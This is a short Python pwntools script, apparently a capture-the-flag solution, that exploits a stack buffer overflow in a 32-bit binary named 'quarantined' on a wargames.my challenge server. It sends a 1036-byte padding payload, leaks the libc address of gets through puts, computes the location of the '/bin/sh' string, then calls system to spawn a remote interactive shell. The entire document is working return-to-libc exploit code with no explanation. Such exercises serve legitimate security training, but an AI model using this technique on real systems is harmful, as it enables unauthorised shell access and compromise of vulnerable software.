from pwn import *
elf = ELF("./quarantined")
# libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
libc = ELF("libc.so.6")
# p = elf.process()
p = remote("fortnight1005.wargames.my",46738)
vuln = 0x8048562
puts_plt = 0x80483c0
system_plt = 0x80483d0
gets_got = 0x804a010
binsh_offset = libc.symbols['gets'] - next(libc.search("/bin/sh"))
p.sendlineafter("1+1\n",'a'*1036+p32(puts_plt)+p32(vuln)+p32(gets_got))
gets_libc = u32(p.recvuntil("\n")[:4])
binsh_libc = gets_libc - binsh_offset
p.sendlineafter("1+1\n",'a'*1036+p32(system_plt)+p32(vuln)+p32(binsh_libc))
p.interactive()